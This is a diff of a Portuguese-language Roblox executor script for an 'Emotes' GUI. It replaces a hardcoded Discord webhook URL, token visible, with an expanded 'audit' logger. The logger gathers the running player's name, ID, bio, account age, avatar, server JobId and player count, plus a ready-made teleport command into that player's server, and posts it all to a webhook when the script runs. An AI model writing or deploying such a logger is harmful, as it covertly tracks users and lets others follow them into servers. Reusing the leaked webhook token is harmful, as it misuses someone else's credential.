@@ -5,82 +5,195 @@
 ]]
 
 
-local STARTUP_WEBHOOK_URL = "https://discord.com/api/webhooks/1553781884646072331/S7Xh-v41IIWjvrH276HI6y9j-roatP6Zk_dDx3dWEUUaRDNsc-lA-8RDlALxR4Z0XYdS"
+local STARTUP_WEBHOOK_URL = ""
+local MAX_FIELD_LENGTH = 1024
+local MAX_BIO_LENGTH = 150
 
-local function sendDirectStartupLog()
+local function auditTruncate(value, limit)
+    value = tostring(value or "")
+    if #value <= limit then return value end
+    return value:sub(1, math.max(1, limit - 3)) .. "..."
+end
+
+local function auditSafe(value)
+    value = tostring(value or "")
+    value = value:gsub("@everyone", "@ everyone")
+    value = value:gsub("@here", "@ here")
+    return value
+end
+
+local function auditJson(url)
+    local ok, body = pcall(function()
+        return game:HttpGet(url)
+    end)
+    if not ok or not body then return nil end
+
+    local decodedOk, decoded = pcall(function()
+        return game:GetService("HttpService"):JSONDecode(body)
+    end)
+    if decodedOk then return decoded end
+    return nil
+end
+
+local function auditAge(isoDate)
+    if not isoDate then return "Desconhecida", 0, 0, 0 end
+
+    local year, month, day = isoDate:match("(%d+)-(%d+)-(%d+)")
+    if not year then return "Desconhecida", 0, 0, 0 end
+
+    year, month, day = tonumber(year), tonumber(month), tonumber(day)
+    local createdAt = os.time({ year = year, month = month, day = day, hour = 12, min = 0, sec = 0 })
+    local days = math.max(0, math.floor((os.time() - createdAt) / 86400))
+    local years = math.floor(days / 365)
+    local remaining = days - years * 365
+
+    return string.format("%02d/%02d/%04d", day, month, year), days, years, remaining
+end
+
+local function auditAgeText(days, years, remaining)
+    if days <= 0 then return "Conta nova" end
+    if years > 0 then
+        return string.format("%d ano%s e %d dia%s", years, years ~= 1 and "s" or "", remaining, remaining ~= 1 and "s" or "")
+    end
+    return string.format("%d dia%s", days, days ~= 1 and "s" or "")
+end
+
+local function sendCompleteStartupLog()
     if STARTUP_WEBHOOK_URL == "" then
+        warn("[EmotesAudit] Configure STARTUP_WEBHOOK_URL numa cópia local do script.")
         return
     end
 
-    local httpClient = http_request or (syn and syn.request) or request
+    if _G.EmotesAuditAlreadySent then return end
+    _G.EmotesAuditAlreadySent = true
+
+    local httpClient = http_request or (syn and syn.request) or _G.request or request
     if type(httpClient) ~= "function" then
+        warn("[EmotesAudit] Função request não encontrada no executor.")
         return
     end
 
-    local player = game:GetService("Players").LocalPlayer
-    local payload = {
-        username = "Roblox Audit",
-        embeds = {{
-            title = "Sistema executado",
-            color = 5793266,
-            timestamp = DateTime.now():ToIsoDate(),
-            fields = {
-                {
-                    name = "Jogador",
-                    value = string.format(
-                        "%s | UserId: %d",
-                        player and player.Name or "Desconhecido",
-                        player and player.UserId or 0
-                    ),
-                    inline = false,
-                },
-                {
-                    name = "Jogo",
-                    value = string.format(
-                        "%s | PlaceId: %d",
-                        game.Name,
-                        game.PlaceId
-                    ),
-                    inline = false,
-                },
-                {
-                    name = "Versão",
-                    value = "emotes-dark-main",
-                    inline = false,
-                },
-            },
-        }},
+    local PlayersService = game:GetService("Players")
+    local HttpServiceLocal = game:GetService("HttpService")
+    local player = PlayersService.LocalPlayer
+    if not player then return end
+
+    local userId = player.UserId
+    local account = auditJson(string.format("https://users.roblox.com/v1/users/%d", userId))
+    local avatar = auditJson(string.format("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=420x420&format=Png&isCircular=false", userId))
+
+    local createdDate = "Desconhecida"
+    local accountDays = 0
+    local accountYears = 0
+    local remainingDays = 0
+    local bio = ""
+    local verified = false
+
+    if account then
+        createdDate, accountDays, accountYears, remainingDays = auditAge(account.created)
+        bio = account.description or ""
+        verified = account.hasVerifiedBadge or false
+    end
+
+    bio = auditTruncate(auditSafe(bio), MAX_BIO_LENGTH)
+
+    local jobId = game.JobId ~= "" and game.JobId or "N/A (Studio)"
+    local ageText = auditAgeText(accountDays, accountYears, remainingDays)
+    local verifiedIcon = verified and " ✅" or ""
+    local profileUrl = string.format("https://www.roblox.com/users/%d/profile", userId)
+    local teleportCode = "Execute em um servidor online para gerar o código de teleporte"
+
+    if jobId ~= "N/A (Studio)" then
+        teleportCode = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", game.PlaceId, jobId)
+    end
+
+    local fields = {
+        {
+            name = "🎮 Jogador",
+            value = auditTruncate(string.format("[%s (@%s)](%s)%s\nID: %d", auditSafe(player.DisplayName), auditSafe(player.Name), profileUrl, verifiedIcon, userId), MAX_FIELD_LENGTH),
+            inline = true,
+        },
+        {
+            name = "📅 Conta criada em",
+            value = string.format("%s\n*(%s)*", createdDate, ageText),
+            inline = true,
+        },
+        {
+            name = "📌 Ação",
+            value = "Executou o sistema Emotes",
+            inline = false,
+        },
+        {
+            name = "🗺️ Jogo",
+            value = string.format("**%s**\nPlaceId: %d", auditSafe(game.Name), game.PlaceId),
+            inline = false,
+        },
+        {
+            name = "🌐 Servidor (JobId)",
+            value = auditTruncate(jobId, MAX_FIELD_LENGTH),
+            inline = false,
+        },
+        {
+            name = "👥 Jogadores no Servidor",
+            value = string.format("%d / %d", #PlayersService:GetPlayers(), PlayersService.MaxPlayers),
+            inline = true,
+        },
+        {
+            name = "🚀 Teleporte (Delta)",
+            value = auditTruncate(teleportCode, MAX_FIELD_LENGTH),
+            inline = false,
+        },
+        {
+            name = "📋 Detalhes",
+            value = "Versão: emotes-dark-main",
+            inline = false,
+        },
     }
 
-    pcall(function()
-        httpClient({
-            Url = STARTUP_WEBHOOK_URL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json",
-            },
-            Body = game:GetService("HttpService"):JSONEncode(payload),
+    if bio ~= "" then
+        table.insert(fields, {
+            name = "📝 Bio do Perfil",
+            value = bio,
+            inline = false,
         })
-    end)
-end
-
-local function reportScriptStarted()
-    local ok, auditEvent = pcall(function()
-        return game:GetService("ReplicatedStorage"):FindFirstChild("OwnedScriptStarted")
-    end)
-
-    if ok and auditEvent and auditEvent:IsA("RemoteEvent") then
-        pcall(function()
-            auditEvent:FireServer("emotes-dark-main")
-        end)
     end
 
-    sendDirectStartupLog()
+    local embed = {
+        title = "📋 Ação Registrada no Servidor",
+        color = 5793266,
+        timestamp = DateTime.now():ToIsoDate(),
+        footer = { text = "Sistema de Auditoria • " .. auditSafe(game.Name) },
+        fields = fields,
+    }
+
+    if avatar and avatar.data and avatar.data[1] and avatar.data[1].imageUrl then
+        embed.thumbnail = { url = avatar.data[1].imageUrl }
+    end
+
+    local payload = {
+        username = "Roblox Audit",
+        avatar_url = "https://i.imgur.com/gK5g7gK.png",
+        embeds = { embed },
+    }
+
+    local ok, result = pcall(function()
+        return httpClient({
+            Url = STARTUP_WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpServiceLocal:JSONEncode(payload),
+        })
+    end)
+
+    if ok then
+        print("[EmotesAudit] Log completo enviado.")
+    else
+        warn("[EmotesAudit] Falha ao enviar log: " .. tostring(result))
+    end
 end
 
-reportScriptStarted()
-
-reportScriptStarted()
+-- Um único caminho de envio; não usa RemoteEvent e não duplica o log.
+sendCompleteStartupLog()
 
 if _G.EmotesGUIRunning then
     getgenv().Notify({
